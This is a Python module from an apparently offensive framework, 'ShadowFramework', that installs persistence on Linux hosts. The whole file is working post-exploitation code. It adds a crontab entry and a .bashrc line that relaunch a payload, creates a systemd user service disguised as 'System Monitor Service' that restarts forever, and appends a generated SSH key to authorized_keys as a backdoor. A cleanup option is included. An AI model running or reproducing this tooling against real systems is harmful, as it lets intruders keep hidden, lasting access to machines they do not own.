"""
ShadowFramework — Persistence
Installs persistence mechanisms on local Linux systems.
"""
import os
import subprocess
import getpass
from pathlib import Path
from rich.console import Console
from rich.table import Table
from utils.logger import log_action

console = Console()


class Module:
    MODULE_INFO = {
        'name': 'post/persistence',
        'description': 'Install persistence mechanisms: crontab, bashrc, systemd, authorized_keys.',
        'options': {
            'METHOD':  'Method: cron, bashrc, systemd, ssh_key, all [default: cron]',
            'PAYLOAD': 'Command/script to persist [default: /tmp/shadow_agent.py]',
            'INTERVAL': 'Cron interval [default: */5 * * * *]',
            'CLEANUP': 'Remove persistence instead of installing [default: false]',
        }
    }

    def __init__(self, framework):
        self.framework = framework

    def _install_cron(self, payload, interval):
        """Install via crontab."""
        console.print("[cyan][*] Installing cron persistence...[/cyan]")
        try:
            # Get current crontab
            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            current = result.stdout if result.returncode == 0 else ''
            
            marker = '# shadow-persist'
            if marker in current:
                console.print("  [yellow]Already installed.[/yellow]")
                return True
            
            new_entry = f"{interval} python3 {payload} >/dev/null 2>&1 {marker}\n"
            new_crontab = current + new_entry
            
            proc = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE, text=True)
            proc.communicate(input=new_crontab)
            
            if proc.returncode == 0:
                console.print(f"[green][+] Cron installed: {interval} → {payload}[/green]")
                log_action(f"Persistence: cron installed for {payload}")
                return True
            return False
        except Exception as e:
            console.print(f"[red]  Error: {e}[/red]")
            return False

    def _install_bashrc(self, payload):
        """Install via .bashrc."""
        console.print("[cyan][*] Installing bashrc persistence...[/cyan]")
        try:
            bashrc = Path.home() / '.bashrc'
            marker = '# shadow-persist'
            
            content = bashrc.read_text() if bashrc.exists() else ''
            if marker in content:
                console.print("  [yellow]Already installed.[/yellow]")
                return True
            
            line = f"\n(nohup python3 {payload} >/dev/null 2>&1 &) {marker}\n"
            with open(bashrc, 'a') as f:
                f.write(line)
            
            console.print(f"[green][+] bashrc persistence installed.[/green]")
            log_action(f"Persistence: bashrc for {payload}")
            return True
        except Exception as e:
            console.print(f"[red]  Error: {e}[/red]")
            return False

    def _install_systemd(self, payload):
        """Install as user systemd service."""
        console.print("[cyan][*] Installing systemd user service...[/cyan]")
        try:
            svc_dir = Path.home() / '.config' / 'systemd' / 'user'
            svc_dir.mkdir(parents=True, exist_ok=True)
            
            svc_file = svc_dir / 'shadow-agent.service'
            svc_content = f"""[Unit]
Description=System Monitor Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {payload}
Restart=always
RestartSec=30

[Install]
WantedBy=default.target
"""
            svc_file.write_text(svc_content)
            
            subprocess.run(['systemctl', '--user', 'daemon-reload'], capture_output=True)
            subprocess.run(['systemctl', '--user', 'enable', 'shadow-agent.service'], capture_output=True)
            subprocess.run(['systemctl', '--user', 'start', 'shadow-agent.service'], capture_output=True)
            
            # Verify
            result = subprocess.run(['systemctl', '--user', 'is-active', 'shadow-agent.service'],
                                    capture_output=True, text=True)
            status = result.stdout.strip()
            
            console.print(f"[green][+] Systemd service installed ({status}).[/green]")
            log_action(f"Persistence: systemd user service for {payload}")
            return True
        except Exception as e:
            console.print(f"[red]  Error: {e}[/red]")
            return False

    def _install_ssh_key(self, payload=None):
        """Add SSH public key to authorized_keys."""
        console.print("[cyan][*] Installing SSH key persistence...[/cyan]")
        try:
            ssh_dir = Path.home() / '.ssh'
            ssh_dir.mkdir(mode=0o700, exist_ok=True)
            
            key_file = ssh_dir / 'shadow_key'
            auth_keys = ssh_dir / 'authorized_keys'
            
            # Generate key if not exists
            if not key_file.exists():
                subprocess.run(['ssh-keygen', '-t', 'ed25519', '-f', str(key_file),
                               '-N', '', '-C', 'shadow-persist'], capture_output=True)
            
            # Read public key
            pub_key = (key_file.with_suffix('.pub')).read_text().strip() if key_file.with_suffix('.pub').exists() else None
            
            if pub_key:
                current = auth_keys.read_text() if auth_keys.exists() else ''
                if pub_key not in current:
                    with open(auth_keys, 'a') as f:
                        f.write(f"\n{pub_key}\n")
                    os.chmod(auth_keys, 0o600)
                
                console.print(f"[green][+] SSH key added to authorized_keys.[/green]")
                console.print(f"    [dim]Private key: {key_file}[/dim]")
                console.print(f"    [dim]Connect: ssh -i {key_file} {getpass.getuser()}@<target>[/dim]")
                log_action(f"Persistence: SSH key added")
                return True
            return False
        except Exception as e:
            console.print(f"[red]  Error: {e}[/red]")
            return False

    def _cleanup(self):
        """Remove all persistence mechanisms."""
        console.print("[cyan][*] Cleaning up persistence...[/cyan]")
        
        # Cron
        try:
            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            if result.returncode == 0 and '# shadow-persist' in result.stdout:
                new = '\n'.join(l for l in result.stdout.splitlines() if '# shadow-persist' not in l)
                proc = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE, text=True)
                proc.communicate(input=new)
                console.print("  [green]✓ Cron cleaned[/green]")
        except Exception:
            pass

        # Bashrc
        bashrc = Path.home() / '.bashrc'
        if bashrc.exists():
            content = bashrc.read_text()
            if '# shadow-persist' in content:
                new = '\n'.join(l for l in content.splitlines() if '# shadow-persist' not in l)
                bashrc.write_text(new)
                console.print("  [green]✓ Bashrc cleaned[/green]")

        # Systemd
        svc = Path.home() / '.config/systemd/user/shadow-agent.service'
        if svc.exists():
            subprocess.run(['systemctl', '--user', 'stop', 'shadow-agent.service'], capture_output=True)
            subprocess.run(['systemctl', '--user', 'disable', 'shadow-agent.service'], capture_output=True)
            svc.unlink()
            console.print("  [green]✓ Systemd service removed[/green]")

        console.print("[green][+] Cleanup complete.[/green]")

    def run(self):
        method = self.framework.options.get('METHOD', 'cron').lower()
        payload = self.framework.options.get('PAYLOAD', '/tmp/shadow_agent.py')
        interval = self.framework.options.get('INTERVAL', '*/5 * * * *')
        cleanup = self.framework.options.get('CLEANUP', 'false').lower() == 'true'

        if cleanup:
            self._cleanup()
            return

        console.print(f"[*] Installing persistence (method: [cyan]{method}[/cyan])")
        log_action(f"Persistence installation: {method}")

        results = []
        if method in ('all', 'cron'):
            results.append(('Cron', self._install_cron(payload, interval)))
        if method in ('all', 'bashrc'):
            results.append(('Bashrc', self._install_bashrc(payload)))
        if method in ('all', 'systemd'):
            results.append(('Systemd', self._install_systemd(payload)))
        if method in ('all', 'ssh_key'):
            results.append(('SSH Key', self._install_ssh_key()))

        table = Table(title="Persistence Results")
        table.add_column("Method", style="cyan")
        table.add_column("Status")
        for name, ok in results:
            table.add_row(name, "[green]INSTALLED[/green]" if ok else "[red]FAILED[/red]")
        console.print(table)
